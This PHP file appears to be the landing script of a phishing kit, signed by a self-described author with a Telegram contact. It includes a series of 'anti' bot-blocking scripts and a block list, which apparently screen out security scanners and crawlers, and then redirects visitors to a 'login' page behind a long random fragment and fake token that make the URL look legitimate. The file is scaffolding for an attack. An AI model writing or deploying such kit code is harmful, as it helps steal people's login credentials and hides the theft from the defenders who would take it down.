<?php

    /*
    ███╗   ███╗██████╗ ██████╗ ██╗██╗  ██╗███╗   ███╗██╗███╗   ██╗██████╗ 
    ████╗ ████║╚════██╗██╔══██╗██║██║  ██║████╗ ████║██║████╗  ██║╚════██╗
    ██╔████╔██║ █████╔╝██║  ██║██║███████║██╔████╔██║██║██╔██╗ ██║ █████╔╝
    ██║╚██╔╝██║ ╚═══██╗██║  ██║██║╚════██║██║╚██╔╝██║╚═╝██║╚██╗██║ ╚═══██╗
    ██║ ╚═╝ ██║██████╔╝██████╔╝███████╗██║██║ ╚═╝ ██║██╗██║ ╚████║██████╔╝
    ╚═╝     ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═════╝ 
         c0ded By M3dL4m!n3  Contact Telegram: @M3dL4m1n3
    */
	include '../cagebot/anti1.php';
	include '../cagebot/anti2.php';
	include '../cagebot/anti3.php';
	include '../cagebot/anti4.php';
	include '../cagebot/anti5.php';
	include '../cagebot/anti6.php';
	include '../cagebot/anti7.php';
	include '../cagebot/anti8.php';
	include '../cagebot/anti9.php';
	include '../blocks.php';
	include '../vendor/random.php';

	header('Location: login#'.RandomString(75,100)."&token=".RandomString(75,100).'');


?>
    